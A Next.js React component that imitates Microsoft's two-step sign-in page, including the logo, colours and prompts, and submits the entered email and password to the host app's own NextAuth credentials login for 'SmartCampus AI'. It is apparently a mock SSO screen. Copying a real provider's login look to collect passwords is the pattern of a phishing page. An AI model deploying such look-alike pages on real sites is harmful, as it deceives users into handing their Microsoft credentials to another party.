"use client";

import React, { useState } from "react";
import { signIn } from "next-auth/react";
import { ArrowLeft } from "lucide-react";

export default function MicrosoftLoginPage() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError("Enter a valid email address.");
      return;
    }
    // Simple validation
    if (!email.includes("@")) {
      setError("Enter a valid email address, phone number, or Skype name.");
      return;
    }
    setError(null);
    setStep(2);
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError("Please enter the password for your account.");
      return;
    }
    setLoading(true);
    setError(null);

    try {
      // Trigger NextAuth credentials sign-in in the popup with redirect: false
      const res = await signIn("credentials", {
        email,
        password,
        redirect: false,
      });

      if (res?.error || !res?.ok) {
        // Sign-in failed. Redirect popup to /login-success with error query param
        window.location.href = "/login-success?error=AccessDenied&reason=email_not_in_database";
      } else {
        // Sign-in succeeded. Redirect popup to /login-success
        window.location.href = `/login-success?email=${encodeURIComponent(email)}`;
      }
    } catch (err) {
      console.error("SSO Login Error:", err);
      setError("An error occurred during sign-in.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F2F2F2] flex items-center justify-center font-sans p-4 select-none">
      <div className="bg-white border border-[#D2D2D2] shadow-[0_2px_6px_rgba(0,0,0,0.2)] w-full max-w-[440px] p-11 flex flex-col justify-between min-h-[360px]">
        <div>
          {/* Microsoft Logo (Four Squares) */}
          <div className="flex gap-[2px] mb-6 w-11 h-11 flex-wrap">
            <div className="w-[21px] h-[21px] bg-[#F25022]" />
            <div className="w-[21px] h-[21px] bg-[#7FBA00]" />
            <div className="w-[21px] h-[21px] bg-[#00A4EF]" />
            <div className="w-[21px] h-[21px] bg-[#FFB900]" />
          </div>

          {step === 1 ? (
            <form onSubmit={handleNext} className="flex flex-col">
              <h1 className="text-2xl font-semibold text-[#1B1B1B] mb-1">Sign in</h1>
              <p className="text-sm text-[#1B1B1B] mb-5">to continue to SmartCampus AI</p>

              {error && (
                <div className="text-xs text-[#E81123] mb-3">{error}</div>
              )}

              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email, phone, or Skype"
                autoFocus
                className="w-full border-b border-[#666666] focus:border-[#0067B8] focus:outline-none py-1.5 text-sm text-[#1B1B1B] placeholder:text-[#666666] mb-5 transition-colors"
              />

              <div className="text-xs text-[#1B1B1B] mb-6">
                No account? <span className="text-[#0067B8] hover:underline cursor-pointer">Create one!</span>
              </div>

              <div className="flex justify-end gap-3">
                <button
                  type="submit"
                  className="bg-[#0067B8] hover:bg-[#005DA6] text-white px-8 py-1.5 text-[15px] font-normal transition-colors"
                >
                  Next
                </button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleSignIn} className="flex flex-col">
              <div className="flex items-center gap-2 mb-4">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="hover:bg-[#E5E5E5] rounded-full p-1 transition-colors text-[#1B1B1B]"
                >
                  <ArrowLeft className="w-4 h-4" />
                </button>
                <span className="text-sm text-[#1B1B1B] truncate max-w-[280px]">{email}</span>
              </div>

              <h1 className="text-2xl font-semibold text-[#1B1B1B] mb-4">Enter password</h1>

              {error && (
                <div className="text-xs text-[#E81123] mb-3">{error}</div>
              )}

              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                autoFocus
                className="w-full border-b border-[#666666] focus:border-[#0067B8] focus:outline-none py-1.5 text-sm text-[#1B1B1B] placeholder:text-[#666666] mb-8 transition-colors"
              />

              <div className="flex justify-end gap-3">
                <button
                  type="submit"
                  disabled={loading}
                  className="bg-[#0067B8] hover:bg-[#005DA6] text-white px-8 py-1.5 text-[15px] font-normal min-w-[96px] flex items-center justify-center transition-colors disabled:opacity-75"
                >
                  {loading ? (
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  ) : (
                    "Sign in"
                  )}
                </button>
              </div>
            </form>
          )}
        </div>

        <div className="text-xs text-[#555555] flex justify-between mt-8 border-t border-[#E5E5E5] pt-4">
          <span className="hover:underline cursor-pointer">Terms of use</span>
          <span className="hover:underline cursor-pointer">Privacy & cookies</span>
          <span>...</span>
        </div>
      </div>
    </div>
  );
}
